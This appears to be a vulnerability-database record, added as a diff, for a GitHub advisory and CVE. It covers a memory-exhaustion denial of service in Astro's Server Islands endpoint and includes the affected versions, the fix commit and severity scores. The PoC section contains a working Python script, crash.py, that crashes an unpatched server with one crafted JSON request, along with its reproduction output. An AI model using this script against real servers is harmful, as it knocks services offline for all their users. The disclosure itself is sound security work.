@@ -1,0 +1,349 @@
+advisory_id: GHSA-3rmj-9m5h-8fpv
+datasource_id: github_osv/GHSA-3rmj-9m5h-8fpv
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-3rmj-9m5h-8fpv/GHSA-3rmj-9m5h-8fpv.json
+aliases:
+  - CVE-2026-29772
+summary: |
+  Astro: Memory exhaustion DoS due to missing request body size limit in Server Islands
+  ### Summary
+
+  Astro's Server Islands POST handler buffers and parses the full request body as JSON without enforcing a size limit. Because `JSON.parse()` allocates a V8 heap object for every element in the input, a crafted payload of many small JSON objects achieves ~15x memory amplification (wire bytes to heap bytes), allowing a single unauthenticated request to exhaust the process heap and crash the server. The `/_server-islands/[name]` route is registered on all Astro SSR apps regardless of whether any component uses `server:defer`, and the body is parsed before the island name is validated, so any Astro SSR app with the Node standalone adapter is affected.
+
+  ### Details
+
+  Astro automatically registers a Server Islands route at `/_server-islands/[name]` on all SSR apps, regardless of whether any component uses `server:defer`. The POST handler in `packages/astro/src/core/server-islands/endpoint.ts` buffers the entire request body into memory and parses it as JSON with no size or depth limit:
+
+  ```js
+  // packages/astro/src/core/server-islands/endpoint.ts (lines 55-56)
+  const raw = await request.text();    // full body buffered into memory — no size limit
+  const data = JSON.parse(raw);        // parsed into V8 object graph — no element count limit
+  ```
+
+  The request body is parsed before the island name is validated, so the attacker does not need to know any valid island name — `/_server-islands/anything` triggers the vulnerable code path. No authentication is required.
+
+  Additionally, `JSON.parse()` allocates a heap object for every array/object in the input, so a payload consisting of many empty JSON objects (e.g., `[{},{},{},...]`) achieves ~15x memory amplification (wire bytes to heap bytes). The entire object graph is held as a single live reference until parsing completes, preventing garbage collection. An 8.6 MB request is sufficient to crash a server with a 128 MB heap limit.
+
+  ### PoC
+
+  **Environment:** Astro 5.18.0, `@astrojs/node` 9.5.4, Node.js 22 with `--max-old-space-size=128`.
+
+  The app does **not** use `server:defer` — this is a minimal SSR setup with no server island components. The route is still registered and exploitable.
+
+  **Setup files:**
+
+  `package.json`:
+  ```json
+  {
+    "name": "poc-server-islands-dos",
+    "scripts": {
+      "build": "astro build",
+      "start": "node --max-old-space-size=128 dist/server/entry.mjs"
+    },
+    "dependencies": {
+      "astro": "5.18.0",
+      "@astrojs/node": "9.5.4"
+    }
+  }
+  ```
+
+  `astro.config.mjs`:
+  ```js
+  import { defineConfig } from 'astro/config';
+  import node from '@astrojs/node';
+
+  export default defineConfig({
+    output: 'server',
+    adapter: node({ mode: 'standalone' }),
+  });
+  ```
+
+  `src/pages/index.astro`:
+  ```astro
+  ---
+  ---
+  <html>
+  <head><title>Astro App</title></head>
+  <body>
+    <h1>Hello</h1>
+    <p>Just a plain SSR page. No server islands.</p>
+  </body>
+  </html>
+  ```
+
+  `Dockerfile`:
+  ```dockerfile
+  FROM node:22-slim
+  WORKDIR /app
+  COPY package.json .
+  RUN npm install
+  COPY . .
+  RUN npm run build
+  EXPOSE 4321
+  CMD ["node", "--max-old-space-size=128", "dist/server/entry.mjs"]
+  ```
+
+  `docker-compose.yml`:
+  ```yaml
+  services:
+    astro:
+      build: .
+      ports:
+        - "4321:4321"
+      deploy:
+        resources:
+          limits:
+            memory: 256m
+  ```
+
+  **Reproduction:**
+
+  ```bash
+  # Build and start
+  docker compose up -d
+
+  # Verify server is running
+  curl http://localhost:4321/
+  # => 200 OK
+  ```
+
+  `crash.py`:
+  ```python
+  import requests
+
+  # Any path under /_server-islands/ works — no valid island name needed
+  TARGET = "http://localhost:4321/_server-islands/x"
+
+  # 3M empty objects: each {} is ~3 bytes JSON but ~56-80 bytes as V8 object
+  # 8.6 MB on wire → ~180+ MB heap allocation → exceeds 128 MB limit
+  n = 3_000_000
+  payload = '[' + ','.join(['{}'] * n) + ']'
+  print(f"Payload: {len(payload) / (1024*1024):.1f} MB")
+
+  try:
+      r = requests.post(TARGET, data=payload,
+          headers={"Content-Type": "application/json"}, timeout=30)
+      print(f"Status: {r.status_code}")
+  except requests.exceptions.ConnectionError:
+      print("Server crashed (OOM killed)")
+  ```
+
+  ```
+  $ python crash.py
+  Payload: 8.6 MB
+  Server crashed (OOM killed)
+
+  $ curl http://localhost:4321/
+  curl: (7) Failed to connect to localhost port 4321: Connection refused
+
+  $ docker compose ps
+  NAME      IMAGE     COMMAND   SERVICE   CREATED   STATUS    PORTS
+  (empty — container was OOM killed)
+  ```
+
+  The server process is killed and does not recover. Repeated requests in a containerized environment with restart policies cause a persistent crash-restart loop.
+
+  ### Impact
+
+  Any Astro SSR app with the Node standalone adapter is affected — the `/_server-islands/[name]` route is registered by default regardless of whether any component uses `server:defer`. Unauthenticated attackers can crash the server process with a single crafted HTTP request under 9 MB. In containerized environments with memory limits, repeated requests cause a persistent crash-restart loop, denying service to all users. The attack requires no authentication and no knowledge of valid island names — any value in the `[name]` parameter works because the body is parsed before the name is validated.
+impacted_packages:
+  - purl: pkg:npm/%40astrojs/node
+    affected_versions: vers:npm/<10.0.0
+    fixed_versions: vers:npm/10.0.0
+    affected_packages:
+      - pkg:npm/%40astrojs/node@0.0.0-adapter-sessions-20250207124921
+      - pkg:npm/%40astrojs/node@0.0.0-add-stable-20231208215901
+      - pkg:npm/%40astrojs/node@0.0.0-cloudcannon-fix-20230306211609
+      - pkg:npm/%40astrojs/node@0.0.0-content-collections-20221215161753
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221118232407
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221118233302
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221129235256
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221130135236
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221205202838
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221207142945
+      - pkg:npm/%40astrojs/node@0.0.0-content-schemas-20221209180144
+      - pkg:npm/%40astrojs/node@0.0.0-edge-middleware-verification-20240205180401
+      - pkg:npm/%40astrojs/node@0.0.0-edge-nested-20240223135627
+      - pkg:npm/%40astrojs/node@0.0.0-error-overlay-20221130171441
+      - pkg:npm/%40astrojs/node@0.0.0-error-overlay-20221203190718
+      - pkg:npm/%40astrojs/node@0.0.0-experimental-assets-20230307131344
+      - pkg:npm/%40astrojs/node@0.0.0-experimental-container-20240613104104
+      - pkg:npm/%40astrojs/node@0.0.0-fixwin-20221216184820
+      - pkg:npm/%40astrojs/node@0.0.0-imgcache-20220929145446
+      - pkg:npm/%40astrojs/node@0.0.0-isr-20240110194136
+      - pkg:npm/%40astrojs/node@0.0.0-isr-20240125224234
+      - pkg:npm/%40astrojs/node@0.0.0-join-base-20221208170900
+      - pkg:npm/%40astrojs/node@0.0.0-loaders-20230222215040
+      - pkg:npm/%40astrojs/node@0.0.0-middleware-20230405160200
+      - pkg:npm/%40astrojs/node@0.0.0-node-standalone-20221011210529
+      - pkg:npm/%40astrojs/node@0.0.0-node-trailing-slash-20240118204342
+      - pkg:npm/%40astrojs/node@0.0.0-prerender-20221209214618
+      - pkg:npm/%40astrojs/node@0.0.0-prerender-20221209224429
+      - pkg:npm/%40astrojs/node@0.0.0-prerender-20221215200617
+      - pkg:npm/%40astrojs/node@0.0.0-prerender-20221215222121
+      - pkg:npm/%40astrojs/node@0.0.0-rc-20220721064837
+      - pkg:npm/%40astrojs/node@0.0.0-rc-20220722032928
+      - pkg:npm/%40astrojs/node@0.0.0-rc-20220725043302
+      - pkg:npm/%40astrojs/node@0.0.0-rc-20220726043527
+      - pkg:npm/%40astrojs/node@0.0.0-server-islands-20240621194657
+      - pkg:npm/%40astrojs/node@0.0.0-server-islands-20240703133809
+      - pkg:npm/%40astrojs/node@0.0.0-server-islands-20240709194928
+      - pkg:npm/%40astrojs/node@0.0.0-toolbar-absolute-paths-20240126155246
+      - pkg:npm/%40astrojs/node@0.0.2-next.0
+      - pkg:npm/%40astrojs/node@0.0.2
+      - pkg:npm/%40astrojs/node@0.1.0
+      - pkg:npm/%40astrojs/node@0.1.1
+      - pkg:npm/%40astrojs/node@0.1.2
+      - pkg:npm/%40astrojs/node@0.1.3
+      - pkg:npm/%40astrojs/node@0.1.4
+      - pkg:npm/%40astrojs/node@0.1.5
+      - pkg:npm/%40astrojs/node@0.1.6
+      - pkg:npm/%40astrojs/node@0.2.0
+      - pkg:npm/%40astrojs/node@0.2.1
+      - pkg:npm/%40astrojs/node@1.0.0
+      - pkg:npm/%40astrojs/node@1.0.1
+      - pkg:npm/%40astrojs/node@1.1.0
+      - pkg:npm/%40astrojs/node@2.0.0
+      - pkg:npm/%40astrojs/node@2.0.1
+      - pkg:npm/%40astrojs/node@2.0.2
+      - pkg:npm/%40astrojs/node@3.0.0
+      - pkg:npm/%40astrojs/node@3.1.0
+      - pkg:npm/%40astrojs/node@3.1.1
+      - pkg:npm/%40astrojs/node@4.0.0
+      - pkg:npm/%40astrojs/node@5.0.0-beta.0
+      - pkg:npm/%40astrojs/node@5.0.0-beta.1
+      - pkg:npm/%40astrojs/node@5.0.0
+      - pkg:npm/%40astrojs/node@5.0.1
+      - pkg:npm/%40astrojs/node@5.0.2
+      - pkg:npm/%40astrojs/node@5.0.3
+      - pkg:npm/%40astrojs/node@5.0.4
+      - pkg:npm/%40astrojs/node@5.1.0
+      - pkg:npm/%40astrojs/node@5.1.1
+      - pkg:npm/%40astrojs/node@5.1.2
+      - pkg:npm/%40astrojs/node@5.1.3
+      - pkg:npm/%40astrojs/node@5.1.4
+      - pkg:npm/%40astrojs/node@5.2.0
+      - pkg:npm/%40astrojs/node@5.3.0
+      - pkg:npm/%40astrojs/node@5.3.1
+      - pkg:npm/%40astrojs/node@5.3.2
+      - pkg:npm/%40astrojs/node@5.3.3
+      - pkg:npm/%40astrojs/node@5.3.4
+      - pkg:npm/%40astrojs/node@5.3.5
+      - pkg:npm/%40astrojs/node@5.3.6
+      - pkg:npm/%40astrojs/node@6.0.0-beta.0
+      - pkg:npm/%40astrojs/node@6.0.0-rc.1
+      - pkg:npm/%40astrojs/node@6.0.0
+      - pkg:npm/%40astrojs/node@6.0.1
+      - pkg:npm/%40astrojs/node@6.0.2
+      - pkg:npm/%40astrojs/node@6.0.3
+      - pkg:npm/%40astrojs/node@6.0.4
+      - pkg:npm/%40astrojs/node@6.1.0
+      - pkg:npm/%40astrojs/node@7.0.0-beta.0
+      - pkg:npm/%40astrojs/node@7.0.0-beta.1
+      - pkg:npm/%40astrojs/node@7.0.0
+      - pkg:npm/%40astrojs/node@7.0.1
+      - pkg:npm/%40astrojs/node@7.0.2
+      - pkg:npm/%40astrojs/node@7.0.3
+      - pkg:npm/%40astrojs/node@7.0.4
+      - pkg:npm/%40astrojs/node@8.0.0
+      - pkg:npm/%40astrojs/node@8.1.0
+      - pkg:npm/%40astrojs/node@8.2.0
+      - pkg:npm/%40astrojs/node@8.2.1
+      - pkg:npm/%40astrojs/node@8.2.2
+      - pkg:npm/%40astrojs/node@8.2.3
+      - pkg:npm/%40astrojs/node@8.2.4
+      - pkg:npm/%40astrojs/node@8.2.5
+      - pkg:npm/%40astrojs/node@8.2.6
+      - pkg:npm/%40astrojs/node@8.3.0
+      - pkg:npm/%40astrojs/node@8.3.1
+      - pkg:npm/%40astrojs/node@8.3.2
+      - pkg:npm/%40astrojs/node@8.3.3
+      - pkg:npm/%40astrojs/node@8.3.4
+      - pkg:npm/%40astrojs/node@9.0.0-alpha.0
+      - pkg:npm/%40astrojs/node@9.0.0-alpha.1
+      - pkg:npm/%40astrojs/node@9.0.0-beta.2
+      - pkg:npm/%40astrojs/node@9.0.0-beta.3
+      - pkg:npm/%40astrojs/node@9.0.0
+      - pkg:npm/%40astrojs/node@9.0.1
+      - pkg:npm/%40astrojs/node@9.0.2
+      - pkg:npm/%40astrojs/node@9.0.3
+      - pkg:npm/%40astrojs/node@9.1.0
+      - pkg:npm/%40astrojs/node@9.1.1
+      - pkg:npm/%40astrojs/node@9.1.2
+      - pkg:npm/%40astrojs/node@9.1.3
+      - pkg:npm/%40astrojs/node@9.2.0
+      - pkg:npm/%40astrojs/node@9.2.1
+      - pkg:npm/%40astrojs/node@9.2.2
+      - pkg:npm/%40astrojs/node@9.3.0
+      - pkg:npm/%40astrojs/node@9.3.1
+      - pkg:npm/%40astrojs/node@9.3.2
+      - pkg:npm/%40astrojs/node@9.3.3
+      - pkg:npm/%40astrojs/node@9.4.0
+      - pkg:npm/%40astrojs/node@9.4.1
+      - pkg:npm/%40astrojs/node@9.4.2
+      - pkg:npm/%40astrojs/node@9.4.3
+      - pkg:npm/%40astrojs/node@9.4.4
+      - pkg:npm/%40astrojs/node@9.4.5
+      - pkg:npm/%40astrojs/node@9.4.6
+      - pkg:npm/%40astrojs/node@9.5.0
+      - pkg:npm/%40astrojs/node@9.5.1
+      - pkg:npm/%40astrojs/node@9.5.2
+      - pkg:npm/%40astrojs/node@9.5.3
+      - pkg:npm/%40astrojs/node@9.5.4
+      - pkg:npm/%40astrojs/node@9.5.5
+      - pkg:npm/%40astrojs/node@10.0.0-alpha.0
+      - pkg:npm/%40astrojs/node@10.0.0-alpha.2
+      - pkg:npm/%40astrojs/node@10.0.0-alpha.3
+      - pkg:npm/%40astrojs/node@10.0.0-beta.0
+      - pkg:npm/%40astrojs/node@10.0.0-beta.1
+      - pkg:npm/%40astrojs/node@10.0.0-beta.2
+      - pkg:npm/%40astrojs/node@10.0.0-beta.3
+      - pkg:npm/%40astrojs/node@10.0.0-beta.4
+      - pkg:npm/%40astrojs/node@10.0.0-beta.5
+      - pkg:npm/%40astrojs/node@10.0.0-beta.6
+      - pkg:npm/%40astrojs/node@10.0.0-beta.7
+      - pkg:npm/%40astrojs/node@10.0.0-beta.8
+      - pkg:npm/%40astrojs/node@10.0.0-beta.9
+    fixed_packages:
+      - pkg:npm/%40astrojs/node@10.0.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/withastro/astro
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/withastro/astro
+        commit: f9ee8685dd26e9afeba3b48d41ad6714f624b12f
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-3rmj-9m5h-8fpv/GHSA-3rmj-9m5h-8fpv.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-770
+references:
+  - url: https://github.com/withastro/astro
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/commit/f9ee8685dd26e9afeba3b48d41ad6714f624b12f
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/releases/tag/@astrojs/node@10.0.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-29772
+    reference_type:
+    reference_id: CVE-2026-29772
+  - url: https://github.com/withastro/astro/security/advisories/GHSA-3rmj-9m5h-8fpv
+    reference_type:
+    reference_id: GHSA-3rmj-9m5h-8fpv
+exploits: []
